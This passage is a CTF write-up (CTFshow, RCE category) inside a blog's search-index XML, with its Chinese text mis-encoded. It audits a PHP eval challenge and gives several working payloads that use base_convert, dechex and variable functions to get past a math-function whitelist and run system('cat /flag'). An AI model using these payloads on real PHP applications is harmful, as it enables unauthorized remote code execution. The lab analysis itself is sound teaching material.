&#125;    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>ä»£ç å®¡è®¡</strong></p><p>ä»£ç æ¥å—GETä¼ å‚<code>c</code>ï¼Œä¿å­˜åœ¨<code>content</code>ä¸­ï¼Œå¹¶å¯¹å‚æ•°é•¿åº¦è¿›è¡Œäº†é™åˆ¶<code>&lt;80</code>ã€‚</p><p>ç„¶åè®¾ç½®äº†ä¸€ä¸ªé»‘åå•ï¼Œè¿‡æ»¤äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œ<code>ç©ºæ ¼</code>å’Œ<code>/</code>ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥<code>cat /flag</code>æ— é—¨ã€‚</p><p>æ¥ä¸‹æ¥æä¾›äº†ä¸€ä¸ªç™½åå•ï¼Œé‡Œé¢æ˜¯ä¸€äº›æ•°å­¦å‡½æ•°ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå¸¸ç”¨æ•°å­¦å‡½æ•°çš„é“¾æ¥ï¼Œå¯ä»¥æŸ¥åˆ°è¿™äº›å‡½æ•°çš„ç”¨æ³•ã€‚</p><p>éƒ½æ»¡è¶³ä»¥ä¸Šæ¡ä»¶åï¼Œä½¿ç”¨<code>eval</code>æ¥æ‰§è¡Œä¼ å…¥çš„å‚æ•°ã€‚</p><p>åˆ†æåˆ°è¿™é‡Œï¼Œåªèƒ½åˆ©ç”¨ç™½åå•ä¸­æä¾›çš„å‡½æ•°æ¥æ„é€ å‘½ä»¤ï¼Œç”¨åˆ°çš„å‡½æ•°æœ‰ï¼š</p><ul><li><code>base_convert()</code>ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li><li><code>dechex()</code>ï¼šå°†åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</li><li><code>hex2bin()</code>ï¼šå°†åå…­è¿›åˆ¶è½¬æ¢æˆasciiå­—ç¬¦</li></ul><p><strong>æ€è·¯æ˜¯ï¼šå…ˆåˆ©ç”¨<code>dechex()</code>å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œå†åˆ©ç”¨<code>hex2bin()</code>å°†å¾—åˆ°çš„åå…­è¿›åˆ¶æ•°è½¬æ¢æˆasciiå­—ç¬¦ä¸²ã€‚åˆå› ä¸ºç™½åå•é‡Œæ²¡æœ‰<code>hex2bin()</code>è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨<code>base_convert()</code>æ¥å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ï¼ˆå› ä¸ºä¸‰åå…­è¿›åˆ¶ä¸­å«æœ‰æ•°å­—å­—æ¯ï¼‰æ„é€ å‡º<code>hex2bin</code>ï¼Œæœ€åå°†åˆ†åˆ«ä¼ å…¥çš„å­—ç¬¦ä¸²æ‹¼æ¥å³å¯æ„é€ æˆåŠŸã€‚</strong></p><p>*Trickï¼šåè¿›åˆ¶æ•°<code>37907361743</code>è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ä¹‹åæ­£å¥½å°±æ˜¯<code>hex2bin</code>ã€‚</p><p>å› ä¸ºä»£ç ä¸­å¯¹ä¼ å…¥çš„å‚æ•°<code>c</code>åšäº†é•¿åº¦é™åˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡ä¼ å…¥å…¶å®ƒå‚æ•°ï¼Œåœ¨æ„é€ å‡ºæ¥çš„è¯­å¥ä¸­è°ƒç”¨å³å¯ã€‚</p><p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒPHPä¸­å¯ä»¥å°†å‡½æ•°åä¿å­˜åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå˜é‡æ¥æ›¿ä»£å‡½æ•°åï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>åˆ©ç”¨ä»¥ä¸ŠçŸ¥è¯†ç‚¹ï¼Œå°è¯•æ„é€ å¦‚ä¸‹payloadï¼š</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>æ„é€ è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;å¯ä»¥ä»£æ›¿[]ç»¼ä¸Šï¼š$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GETï¼Œå³æ­¤æ—¶çš„$piå°±æ˜¯_GET</code></pre><p>æ‹¼æ¥å½¢æˆpayloadï¼š</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;è¦åœ¨è¯·æ±‚å¤´é‡Œé¢åŠ ä¸€ä¸ª  1:tac flag.php  è§ä¸‹å›¾</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
